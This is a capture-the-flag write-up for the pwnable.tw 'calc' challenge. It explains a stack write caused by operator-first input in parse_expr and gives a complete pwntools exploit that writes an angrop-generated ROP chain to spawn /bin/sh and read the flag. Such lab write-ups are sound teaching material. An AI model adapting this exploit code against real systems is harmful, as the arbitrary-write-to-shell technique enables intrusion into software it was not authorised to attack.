# calc [150 pts]
> Have you ever use Microsoft calculator?
```c
> checksec calc
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```
A challenge testing reverse engineering and pwn skills. The steps to solve it are:
1. Locate the vulnerability in the `parse_expr` function for an arbitrary stack write.
2. Understand `eval` to use the stack write.
3. Create a ROP chain that calls `execve('/bin/sh', 0, 0)` to win.

## Vulnerability
The `parse_expr` has a buffer `int *pool` that stores all integers of the user-expression. `pool[0]` contains the current index for evaluation.

<img src="https://i.imgur.com/GTiySjS.png" title="source: imgur.com" height=200/>

If the first character of the input is an operator `+-*/%`, `pool[0]` gets modified, which allows us to arbitrarily modify values outside the original pool.

## Exploit
### Arbitrary write
If we enter `+`: the `eval` function does `pool[pool[0] - 1] += pool[pool[0]]`. e.g if we want to add +1234 to `pool[-12]`, we enter the expression `-12+1234`

For ease of use create a function that zeros out the current value and writes our new desired value.
```python
def write(offset: int, data: int):
    """Write data at offset relative to the pool pointer"""
    INT_MAX = 0x7fffffff
    prefix = b'*%d' % offset
    # Set current value to 0 by dividing by INT_MAX twice
    io.sendline(prefix + b'/' + str(INT_MAX).encode())
    io.sendline(prefix + b'/' + str(INT_MAX).encode())

    # Set data
    io.sendline(prefix + b'+' + str(data).encode())
```

### ROP-chain
At offset 362 is the return value from `calc` to `main`. This allows us to write arbitrary values, the **trigger** for the chain is an empty line.

To automatically generate the ropchain I use [angrop](https://github.com/angr/angrop).

```python
import angr, angrop
proj = angr.Project('./calc')
rop = proj.analyses.ROP()
rop.find_gadgets()
# Create a ROP chain that calls execve('/bin/sh', 0, 0)
chain = rop.execve(b'/bin/sh\0')
chain.print_payload_code()
```

Now we have a shell and can read the flag!

## Full code
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or 'calc')
context.terminal = ['tmux', 'new-window']

host = args.HOST or 'chall.pwnable.tw'
port = int(args.PORT or 10100)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
stub alarm
break *calc+186
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()
io.recvline() # Banner

# We build a ROP chain to call system('/bin/sh')
def write(offset: int, data: int):
    """Write data to the stack at offset relative to the pool pointer"""
    INT_MAX = 0x7fffffff
    prefix = b'*%d' % offset
    # Set current value to 0 by dividing by INT_MAX twice
    io.sendline(prefix + b'/' + str(INT_MAX).encode())
    io.sendline(prefix + b'/' + str(INT_MAX).encode())

    # Set data
    io.sendline(prefix + b'+' + str(data).encode())

# Stack offset of return address to main (Our start point for the chain)
main_offset = 362

# /bin/sh Chain generated with angrop
chain = b""
chain += p32(0x80701c9) # add bh, bh; adc eax, 0x80ec9f0; pop edx; pop ecx; pop ebx; ret
chain += p32(0x80ebf48)
chain += p32(0x6e69622f)
chain += p32(0x0)
chain += p32(0x80503a8) # push eax; pop eax; mov dword ptr [edx + 0xb8], ecx; ret
chain += p32(0x80701c9) # add bh, bh; adc eax, 0x80ec9f0; pop edx; pop ecx; pop ebx; ret
chain += p32(0x80ebf4c)
chain += p32(0x68732f)
chain += p32(0x0)
chain += p32(0x80503a8) # push eax; pop eax; mov dword ptr [edx + 0xb8], ecx; ret
chain += p32(0x8058ffc) # pop eax; or dh, dh; ret
chain += p32(0xb)
chain += p32(0x80701d0) # pop edx; pop ecx; pop ebx; ret
chain += p32(0x0)
chain += p32(0x0)
chain += p32(0x80ec000)
chain += p32(0x8070880) # int 0x80

# Write the chain to the stack
for i in range(0, len(chain), 4):
    write(main_offset + i//4, u32(chain[i:i+4]))

# Trigger the chain by exiting calc
io.sendline(b'')

# Bask in the glory of our shell
io.sendline(b'echo WOHOOO it actually worked!')
io.sendline(b'id')
io.sendline(b'cat /home/calc/flag')
io.interactive()
```
